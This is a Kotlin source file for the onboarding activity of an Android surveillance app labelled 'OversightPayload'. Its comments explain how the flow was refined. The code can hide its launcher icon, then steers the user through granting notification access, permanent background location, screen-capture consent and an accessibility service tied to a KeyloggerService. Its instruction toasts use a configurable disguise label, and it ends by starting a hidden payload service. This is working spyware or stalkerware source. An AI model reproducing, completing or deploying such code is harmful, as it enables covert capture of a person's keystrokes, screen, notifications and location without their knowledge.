package com.mobilesvc.agent

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast

/**
 * Onboarding, then exit.
 *
 * This is where the friction lives, and it is worth being precise about it because the builder
 * reports a step count. Android will not grant a dangerous permission from the manifest, and
 * three capabilities are worse than that — they cannot be granted by a dialog at all:
 *
 *  - **background location** — the dialog offers "while using"; "all the time" is a Settings page
 *  - **notification access** — no dialog exists, only `ACTION_NOTIFICATION_LISTENER_SETTINGS`
 *  - **screen capture** — a consent sheet that returns a token, and the token dies with the
 *    process, so it is needed again after every restart
 *
 * The advance loop is the part that took two attempts to get right. The naive version held a
 * single `awaitingReturn` boolean and cleared it in `onResume`, which fails in a way that is
 * invisible until you drive it by hand: every external activity that opens fires `onPause` and
 * then `onResume`, so the flag is consumed by the *first* return and the second one does nothing.
 * The flow then parks on the last step forever with no error.
 *
 * The signal that actually means "the user went away and came back" is `onPause`. So the loop
 * gates on `leftScreen`, and `awaitingReturn` is gone entirely. Each entry point — `onCreate`,
 * `onRequestPermissionsResult`, `onActivityResult`, `onResume` after `leftScreen` — is a distinct
 * event, so `advance()` cannot launch the same external activity twice in one pass.
 *
 * `EXTERNAL_ATTEMPTS` caps relaunches per step. Without it, a user who backs out of a Settings
 * page without flipping the toggle gets bounced back into it forever. After the cap the step is
 * abandoned and the collector reports the capability as unavailable, which is the honest outcome.
 */
class MainActivity : Activity() {

    private enum class Step { PERMISSIONS, NOTIFICATION_ACCESS, BACKGROUND_LOCATION, PROJECTION, ACCESSIBILITY, DONE }

    private lateinit var config: PayloadConfig
    private var step = Step.PERMISSIONS
    private var ready = false
    private var leftScreen = false
    private var attempts = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        config = PayloadConfig.load(this)

        // Hide from the launcher when the config asks for it. Disabling the component survives
        // until the app is launched again by another means, which is exactly why a boot receiver
        // is the companion to this.
        if (config.hideIcon) {
            runCatching {
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        }

        ready = true
        advance()
    }

    override fun onPause() {
        super.onPause()
        // Any external activity — a permission dialog, Settings, the consent sheet — pauses this
        // one. That is the only reliable "the user is coming back to us" signal.
        leftScreen = true
    }

    override fun onResume() {
        super.onResume()
        if (!ready || !leftScreen) return
        leftScreen = false
        // PROJECTION is the one step that must not be re-entered from onResume. Its only legal
        // exit is `onActivityResult`, which carries the consent token; advancing here would
        // re-launch the consent sheet and, worse, could burn the attempt budget and skip the
        // step entirely — which is exactly the bug this guard exists to prevent.
        if (step == Step.PROJECTION) return
        advance()
    }

    /** Walks the chain, skipping every step whose condition is already satisfied. */
    private fun advance() {
        while (true) {
            android.util.Log.i(TAG, "step=$step attempts=$attempts")
            when (step) {
                Step.PERMISSIONS -> {
                    val missing = config.requiredRuntimePermissions().filter {
                        checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
                    }
                    if (missing.isEmpty()) {
                        step = Step.NOTIFICATION_ACCESS
                        attempts = 0
                        continue
                    }
                    requestPermissions(missing.toTypedArray(), REQUEST)
                    return
                }

                Step.NOTIFICATION_ACCESS -> {
                    // No runtime dialog exists for this one at all — it is a signature permission
                    // bound by the system, and the only way in is the listener-settings page.
                    val needed = config.notifications && !hasNotificationAccess()
                    if (!needed) {
                        step = Step.BACKGROUND_LOCATION
                        attempts = 0
                        continue
                    }
                    if (attempts >= EXTERNAL_ATTEMPTS) {
                        step = Step.BACKGROUND_LOCATION
                        continue
                    }
                    attempts++
                    runCatching {
                        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
                        Toast.makeText(
                            this,
                            "Enable ${config.label} under Notification access",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                    return
                }

                Step.BACKGROUND_LOCATION -> {
                    val needed = config.location && !hasBackgroundLocation() &&
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                    if (!needed) {
                        step = Step.PROJECTION
                        attempts = 0
                        continue
                    }
                    if (attempts >= EXTERNAL_ATTEMPTS) {
                        step = Step.PROJECTION
                        continue
                    }
                    attempts++
                    // Background location has no dialog on Android 11+; the app's own permission
                    // page is the only route, and the toast has to name the exact option because
                    // "Allow all the time" is one row below the obvious one.
                    runCatching {
                        startActivity(
                            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                .setData(Uri.fromParts("package", packageName, null))
                        )
                        Toast.makeText(
                            this,
                            "Set Permissions → Location to \"Allow all the time\"",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                    return
                }

                Step.PROJECTION -> {
                    if (!config.screen || ScreenConsent.has() || !ScreenCapturer.supported) {
                        step = Step.ACCESSIBILITY
                        attempts = 0
                        continue
                    }
                    // No attempt cap on this step. The consent sheet has a Cancel button, so a
                    // refusal already arrives as RESULT_CANCELED in onActivityResult; capping
                    // here would instead skip the step silently after two tries and leave the
                    // build reporting screen capture as available when it never was granted.
                    val manager = getSystemService(MEDIA_PROJECTION_SERVICE)
                        as? MediaProjectionManager
                    val intent = runCatching { manager?.createScreenCaptureIntent() }.getOrNull()
                    if (intent == null) {
                        android.util.Log.e(TAG, "createScreenCaptureIntent returned null")
                        step = Step.ACCESSIBILITY
                        continue
                    }
                    runCatching { startActivityForResult(intent, REQUEST_PROJECTION) }
                        .onFailure {
                            android.util.Log.e(TAG, "consent activity did not start", it)
                            step = Step.ACCESSIBILITY
                        }
                    return
                }

                Step.ACCESSIBILITY -> {
                    val needed = config.keylog && !accessibilityEnabled()
                    if (!needed) {
                        step = Step.DONE
                        continue
                    }
                    if (attempts >= EXTERNAL_ATTEMPTS) {
                        step = Step.DONE
                        continue
                    }
                    attempts++
                    runCatching {
                        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                        Toast.makeText(
                            this,
                            "Enable ${config.label} under Downloaded apps",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                    return
                }

                Step.DONE -> {
                    finishAndStart()
                    return
                }
            }
        }
    }

    override fun onRequestPermissionsResult(
        code: Int,
        permissions: Array<out String>,
        results: IntArray
    ) {
        super.onRequestPermissionsResult(code, permissions, results)
        if (code != REQUEST) return
        // This callback already *is* the return; clearing the flag stops the onResume that
        // follows it from advancing a second time and launching the next screen twice.
        leftScreen = false
        attempts = 0
        advance()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != REQUEST_PROJECTION) return
        leftScreen = false

        android.util.Log.i(
            TAG,
            "consent result: code=$resultCode data=${data != null} keys=${runCatching { data?.extras?.keySet()?.toList() }.getOrNull()}"
        )
        if (resultCode == RESULT_OK && data != null) {
            // The token is bound to this process and cannot be serialised into the config asset,
            // so it is parked in-process for the service to pick up on its next cycle.
            ScreenConsent.store(resultCode, data)
        }
        attempts = 0
        step = Step.ACCESSIBILITY
        advance()
    }

    private fun hasBackgroundLocation(): Boolean =
        checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasNotificationAccess(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners"
        ).orEmpty()
        return enabled.contains(packageName)
    }

    private fun accessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ).orEmpty()
        val target = "$packageName/${KeyloggerService::class.java.name}"
        return enabled.split(':').any { it.equals(target, ignoreCase = true) }
    }

    private fun finishAndStart() {
        runCatching { PayloadService.start(this) }
        finish()
    }

    companion object {
        private const val TAG = "OversightPayload"
        private const val REQUEST = 4101
        private const val REQUEST_PROJECTION = 4102

        /** How many times one step may bounce the user into an external screen before giving up. */
        private const val EXTERNAL_ATTEMPTS = 2
    }
}
